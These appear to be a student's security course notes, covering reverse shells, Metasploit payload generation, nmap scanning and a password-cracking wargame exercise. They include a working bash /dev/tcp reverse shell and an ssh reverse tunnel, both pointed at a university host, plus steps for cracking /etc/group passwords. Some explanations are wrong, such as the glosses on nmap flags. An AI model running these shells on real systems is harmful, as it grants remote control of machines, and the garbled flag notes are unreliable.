Get around the lack of ```-e``` in netcat by using a **named pipe**

###/proc
It's an entirely simulated directory of unreal files to give information on current processes
###exec
As a linux command, it replaces the shell with whatever follows exec:

Dangerous Example: ```exec ls``` will ls and then kill itself upon completion. Boom goes your shell

###Bash Sockets (spawning a reverse shell entirely with bash)

    exec 5<>/dev/tcp/moxie.cs.colorado.edu/8888
    cat <&5 | while read line; do $line 2>&5 >&5; done

###Metasploit

    msf console
    use payload/linux/x86/shell/ <tab>

    use payload/linux/x86/shell/shell_reverse_tcp
    set LHOST 128.138.___.___
    set LPORT 8888
    generate -t c

    //or
    generate -t python

    //or if victim does not allow byte x31
    generate -b 31

###Symettric key cryptography
Alice and Bob (A & B) have a key and nobody else does
<br>Examples:
* AES-CBC
* 3DES-EDE-CBC
* RC4

###ssh reverse shell

    ssh -R 22:localhost:9001 dabo6422@moxie.cs.colorado.edu

#Port scanning

Most popular utility for post scanning is **nmap**

```shell
nmap -n -sL <ip_address>/<subnet>
# -n means do reverse DNS lookup
# -sL means simply list
```

##Scanning Tech
###TCP Scans
Old school port scanning: **ping**
* Also known as an ICMP echo (Internet Control Message Protocol)
```shell
nmap -sP #simply ping
```

**ACK scans** are the traditional

If you want to do a SYN Scan:
```shell
sudo nmap -Sp -PA <url>
```

**Stateful firewalls will not respond**
But if a server is not stateful, it will respond to an **ACK Scan** with a reset. That's the sign that it's actually there.

###UDP Pings
```shell
nmap -PU <port list> #default 31338
```

The reason it's such a weird port is because if you hit a normal port, it could be taking it in silently. On the other hand if you hit this weird 31338 port, it just might throw an error. That's good if it does

###ARP Scans
Even faster than TCP
* Downside is it's a LAN protocol (you can only scan machines on your LAN)

#VPN's
port 1194 default for openVPN <br>```id``` and ```id dawson``` can be two different things

```newgrp``` level4 is how to get razor to refresh right after accessing level 4 (instead of logout->login)

* FIrst level is to get the group password. (use john the ripper or a websearch (**md5**)) listed in ```/etc/group```

* There is a group called secret which when trying to ```newgrp secret```, it will prompt for password
* ^ That's only temporary, but ```l33t``` solidifies it
* Run ```l33t``` to set yourself as a permanent member in the group razor
* Run ```score``` in order to show the current standings of the users

------------
Encrypted password to start razor is:

```vi /etc/group```

###File Structures
* A hardlink is just adding another pointer to an i-node
* A directory is just a list of filenames and their associated i-nodes
* A symlink requires the ```-s``` flag
